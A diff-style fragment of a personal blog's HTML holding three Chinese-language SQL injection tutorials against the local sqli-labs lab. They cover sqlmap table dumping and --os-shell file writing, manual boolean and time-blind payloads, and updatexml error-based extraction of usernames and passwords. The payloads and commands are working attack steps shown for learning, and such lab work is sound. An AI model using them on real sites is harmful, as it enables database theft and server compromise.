+<td>耐心等待，或指定 <code>--technique</code></td>
+</tr>
+<tr>
+<td><code>[INFO] fetching tables for database: &#39;security&#39;</code></td>
+<td>正在提取表名</td>
+<td>等待，不要中断</td>
+</tr>
+<tr>
+<td><code>[INFO] retrieved: users</code></td>
+<td>成功提取到表名</td>
+<td>继续下一步</td>
+</tr>
+<tr>
+<td><code>[INFO] the back-end DBMS is MySQL</code></td>
+<td>识别出数据库类型</td>
+<td>可用 MySQL 特有函数（如 <code>LOAD_FILE</code>）</td>
+</tr>
+</tbody></table>
+<h3 id="1-4-高级用法"><a href="#1-4-高级用法" class="headerlink" title="1.4 高级用法"></a>1.4 高级用法</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>–tamper</td>
+<td>调用绕过脚本（如 <code>space2comment</code> 绕过空格过滤)</td>
+</tr>
+<tr>
+<td>–threads</td>
+<td>并发线程数（1-10），盲注时提速</td>
+</tr>
+<tr>
+<td>–delay</td>
+<td>每次请求间隔秒数，防封 IP</td>
+</tr>
+<tr>
+<td>–proxy</td>
+<td>通过代理发送（如 <code>--proxy http://127.0.0.1:8080</code> 走 Burp)</td>
+</tr>
+<tr>
+<td>–random-agent</td>
+<td>随机 User-Agent，避免简单防护</td>
+</tr>
+<tr>
+<td>–batch</td>
+<td>所有选项选默认，全自动化</td>
+</tr>
+<tr>
+<td>–flush-session</td>
+<td>清除缓存重新测试，防止误报</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="2-0-靶场实战"><a href="#2-0-靶场实战" class="headerlink" title="2.0 靶场实战"></a>2.0 靶场实战</h2><p><strong>01 确认注入点符号闭合方式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;     --报错</span><br><span class="line">?id=1&#x27; --+ --恢复</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/1.png"></p>
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/2.png"></p>
+<p><strong>02 确认有无回显</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+             --探测无反应</span><br><span class="line">?id=1&#x27; union select 1,2,3,4 --+   --探测无反应</span><br></pre></td></tr></table></figure>
+
+<p><strong>03 使用报错方式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/3.png"></p>
+<blockquote>
+<p>页面无任何报错回显</p>
+</blockquote>
+<blockquote>
+<p>以上联合注入和报错均不能使用,尝试使用盲注</p>
+</blockquote>
+<p><strong>04 布尔盲注, 探测数据库字段长度看页面变化</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/4.png"></p>
+<blockquote>
+<p>可见该数据库名字段长度是8, 布尔盲注生效</p>
+</blockquote>
+<p><strong>05 使用sqlmap进行快速拖库</strong></p>
+<ul>
+<li><strong>信息梳理</strong><ul>
+<li>该注入点类型为布尔盲注</li>
+<li>数据库名字段长度&#x3D;8</li>
+<li>GET型</li>
+</ul>
+</li>
+<li><strong>获取当前数据库</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --technique=B --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/5.png"></p>
+<blockquote>
+<p>如上图, 布尔盲注成功注入, 获取当前数据库, 库名为 security, 也反证前面获取字段长度无误</p>
+</blockquote>
+<ul>
+<li><strong>获取当前数据库所有表</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; -D security --tables</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/6.png"></p>
+<blockquote>
+<p>成功获取security下所有数据表</p>
+</blockquote>
+<ul>
+<li><strong>获取指定表所有字段</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; -D security -T users --columns</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/7.png"></p>
+<blockquote>
+<p>可见users表中有3个字段,分别是 id password username </p>
+</blockquote>
+<ul>
+<li><strong>获取指定字段数据</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; -D security -T users -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/8.png"></p>
+<blockquote>
+<p>如图, 数据被打印在控制台, 同时默认会在用户\AppData\Local\sqlmap\output\127.0.0.1\dump\security下生成csv文件存放本次结果</p>
+</blockquote>
+<ul>
+<li><strong>获取系统shell</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&quot; --os-shell</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/shell.png"></p>
+<blockquote>
+<p>命令执行后, 第一个选项是当前网站语言, 选择[5]PHP</p>
+<p>第二个选项是选择指定目录,这里选择[2], (靶场部署时路径透明)</p>
+<p>如图已经成功拿到shell</p>
+</blockquote>
+<ul>
+<li>os-shell可执行操作:<ul>
+<li>获取服务器地址</li>
+<li>写入内容<ul>
+<li>文本</li>
+<li>代码</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取网络信息</span></span><br><span class="line">ipconfig      --windows</span><br><span class="line">ifconfig/ip a --linux</span><br><span class="line"><span class="comment"># 写入内容</span></span><br><span class="line"><span class="built_in">echo</span> xxx &gt; 路径/文件名</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>文件写入测试:</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; <span class="built_in">echo</span> hello &gt; D:\phpstudy\WWW\sqli-labs\Less-8\hello.txt</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/16/web-security/sql-injection/2026-07-16-sqlmap/9.png"></p>
+<blockquote>
+<p>以上操作均在本地靶场环境进行，仅供安全学习与授权测试使用，请勿用于未授权攻击。</p>
+<p>The above operations are carried out in the local shooting range environment and are only for safety learning and authorized testing purposes. Please do not use them for unauthorized attacks.</p>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/" class="post-title-link" itemprop="url">Boolean and Time-blind-Injection</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-09 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-09T22:00:00+08:00">2026-07-09</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-07-13 16:41:06" itemprop="dateModified" datetime="2026-07-13T16:41:06+08:00">2026-07-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26</p>
+</blockquote>
+<blockquote>
+<p>Lab: sqli-labs Less-8</p>
+</blockquote>
+<hr>
+<h2 id="1-0-布尔盲注-延时盲注函数"><a href="#1-0-布尔盲注-延时盲注函数" class="headerlink" title="1.0 布尔盲注&amp;延时盲注函数"></a>1.0 布尔盲注&amp;延时盲注函数</h2><p><strong>在布尔注入及延时注入中, 常用函数如下:</strong></p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>函数</th>
+<th>注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>if(条件,返回值1,返回值2)</td>
+<td>判断条件, 若为真返回(返回值1), 否则为返回值2</td>
+</tr>
+<tr>
+<td>2</td>
+<td>substr(str,1,2)</td>
+<td>从第1位开始截取’str’的长度为2 (st)</td>
+</tr>
+<tr>
+<td>3</td>
+<td>length(database())&#x3D;8</td>
+<td>判断数据库名称长度是否为8</td>
+</tr>
+<tr>
+<td>4</td>
+<td>ascii(s)&#x3D;115</td>
+<td>判断字母’s’编码是否为115</td>
+</tr>
+<tr>
+<td>5</td>
+<td>sleep(n)</td>
+<td>延时输出结果,n为秒数</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>手工注入流程(布尔盲注):</strong></p>
+<p><strong>01 判断数据库字符长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length(database())=8 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/1.png"></p>
+<blockquote>
+<p>当前数据库名长度&#x3D;8</p>
+</blockquote>
+<p><strong>02 猜解数据库名,(采用ascii编码)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr(database(), 1,1))=115 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/2.png"></p>
+<blockquote>
+<p>猜测正确,第一位确实为 ‘115’, 小写字母 ‘s’, 继续猜剩余7位即可</p>
+</blockquote>
+<p><strong>03 猜解表名长度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/3.png"></p>
+<blockquote>
+<p>当前数据库第一个表, 表名长度&#x3D;6</p>
+</blockquote>
+<p><strong>04 猜解数据表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/4.png"></p>
+<blockquote>
+<p>当前库第一个表,第一个字母并非 ‘114’ , ‘r’</p>
+</blockquote>
+<p><strong>05 猜解列名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1), 1,1))=114 --+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/5.png"></p>
+<blockquote>
+<p>users 表中第一个字段首字母并非 ‘114’,’r’</p>
+</blockquote>
+<p>…</p>
+<p>盲注每一步都需要猜解大量字符, 以上是标准Payload, 实际过程中使用二分法思路结合ASCII编码进行.</p>
+<p><strong>延时盲注:</strong></p>
+<p>延时盲注即在布尔盲注的语句中添加条件判断if (IF(条件, sleep(秒数), 0)) , 标准格式如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length(database())=8,sleep(3),0)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/09/web-security/sql-injection/2026-07-09-boolean&time-blind-injection/6.png"></p>
+<p>以上语句为真, 执行sleep(3) , 如上图, 浏览器会有加载标识</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/" class="post-title-link" itemprop="url">Error Injection</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-08 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-08T22:00:00+08:00">2026-07-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-07-13 16:41:41" itemprop="dateModified" datetime="2026-07-13T16:41:41+08:00">2026-07-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: sqli-labs Less-5 &amp; Less-11</p>
+</blockquote>
+<h2 id="1-0-报错注入"><a href="#1-0-报错注入" class="headerlink" title="1.0 报错注入"></a>1.0 报错注入</h2><p><strong>01 逻辑原理:</strong></p>
+<ul>
+<li><p>当无union回显时,优先使用报错注入</p>
+</li>
+<li><p><code>updatexml</code> 函数在处理第二个参数（XPath 路径）时，若遇到非法 XPath 表达式会抛出错误，并将错误内容直接返回到页面</p>
+</li>
+</ul>
+<p><strong>02 报错注入Payload模板:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1[闭合符号] and updatexml(1, concat(0x7e, ([标量子查询]), 0x7e), 1) [注释]</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-1-手工注入流程"><a href="#1-1-手工注入流程" class="headerlink" title="1.1 手工注入流程"></a>1.1 手工注入流程</h3><p><strong>01 符号闭合, 确认报错</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;报错 | ?id=1&#x27;--+ 恢复</span><br></pre></td></tr></table></figure>
+
+<p><strong>02 爆库名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/1.png"></p>
+<p><strong>03 爆表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过修改 <code>limit</code> 偏移量（<code>0,1</code> → <code>1,1</code> → …）可逐表爆出所有表名。此处以 <code>limit 3,1</code> 直接定位到第 4 个表(users)作为示例</p>
+</blockquote>
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/2.png"></p>
+<blockquote>
+<p>limit 3,1 第四个表为users</p>
+</blockquote>
+<p><strong>04 爆列名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/3.png"></p>
+<blockquote>
+<p><code>limit 1,1</code>, <code>limit 2,1</code> 分别为 username、password 字段</p>
+</blockquote>
+<p><strong>05 爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from security.users limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/4.png"></p>
+<blockquote>
+<p>使用 <code>limit</code> 逐行提取数据即可</p>
+</blockquote>
+<h3 id="1-2-报错长度限制与绕过"><a href="#1-2-报错长度限制与绕过" class="headerlink" title="1.2 报错长度限制与绕过"></a>1.2 报错长度限制与绕过</h3><p><code>updatexml</code> 的报错信息最长返回 32 个字符，使用 <code>group_concat</code> 聚合多行时极易被截断。常用两种绕过方式：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>Payload 特征</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>逐行提取</td>
+<td><code>concat</code> + <code>limit 0,1</code> 递增</td>
+<td>稳定不截断</td>
+<td>需多次请求</td>
+</tr>
+<tr>
+<td>分段读取</td>
+<td><code>substr(group_concat(...), 1, 30)</code></td>
+<td>一次性聚合</td>
+<td>需手工拼接结果</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-POST-报错注入（Less-11）"><a href="#1-3-POST-报错注入（Less-11）" class="headerlink" title="1.3 POST 报错注入（Less-11）"></a>1.3 POST 报错注入（Less-11）</h3><p>POST 场景只需将注释符改为 <code>#</code>，其余步骤完全一致, 例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/5.png"></p>
+<ul>
+<li>或用 Burp Suite:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=-admin<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) # &amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/6.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
